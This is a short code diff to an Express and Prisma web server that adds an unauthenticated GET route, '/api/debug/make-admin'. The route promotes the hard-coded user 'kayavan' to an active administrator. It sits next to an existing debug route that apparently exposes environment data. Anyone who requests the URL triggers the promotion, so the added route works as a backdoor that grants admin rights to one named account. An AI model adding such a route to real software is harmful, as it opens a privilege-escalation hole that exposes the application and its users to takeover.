@@ -56,6 +56,18 @@ app.get('/api/debug/env', (req, res) => {
   });
 });
 
+app.get('/api/debug/make-admin', async (req, res) => {
+  try {
+    await prisma.user.update({
+      where: { username: 'kayavan' },
+      data: { isAdmin: true, isActive: true }
+    });
+    res.json({ success: true, message: 'kayavan is now an active admin' });
+  } catch (e: any) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
 app.post('/api/auth/register', async (req: Request, res: Response) => {
   const { username, password } = req.body;
   try {
